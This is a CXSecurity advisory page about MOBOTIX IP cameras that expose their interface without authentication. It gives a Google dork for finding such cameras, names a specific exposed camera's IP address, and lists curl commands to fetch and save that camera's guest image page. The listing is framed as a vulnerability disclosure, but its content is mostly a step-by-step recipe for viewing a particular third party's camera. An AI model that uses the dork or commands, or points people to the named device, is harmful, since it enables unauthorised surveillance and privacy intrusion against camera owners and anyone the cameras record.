---
title: MOBOTIX IP cameras Unauthenticated access
url: https://cxsecurity.com/issue/WLB-2025060022
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-06-21
fetch_date: 2025-10-06T22:52:13.531976
---

# MOBOTIX IP cameras Unauthenticated access

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **MOBOTIX IP cameras Unauthenticated access** **2025.06.20**  Credit:  **[hasanwlip](https://cxsecurity.com/author/hasanwlip/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-306](https://cxsecurity.com/cwe/CWE-306 "Click to see CWE-306")**  **[**Dork:** intext:"© 2001-2025 MOBOTIX" -site:\*.\* -inurl:www](https://cxsecurity.com/dorks/)** | |

# Step 1: Search via Google Dork
# Result: http://195.70.120.133/
# Step 2: Visit the IP in a browser
# The camera interface loads directly without requiring any authentication.
# Step 3: Capture the camera interface content using cURL
curl http://195.70.120.133/cgi-bin/guestimage.html
# Optional: Save the raw HTML content to a file
curl http://195.70.120.133/cgi-bin/guestimage.html --output snap.html

**##### References:**

1.

https://www.google.com/search?q=intext:%22%C2%A9+2001-2025+MOBOTIX%22+-site:\*.\*+-inurl:www

2.

https://www.mobotix.com/en

(Official vendor site)
3. Discovered and reported by hasanwlip

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025060022)

[Tweet](https://twitter.com/share)

Vote for this issue:
 4
 -1

80%

20%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top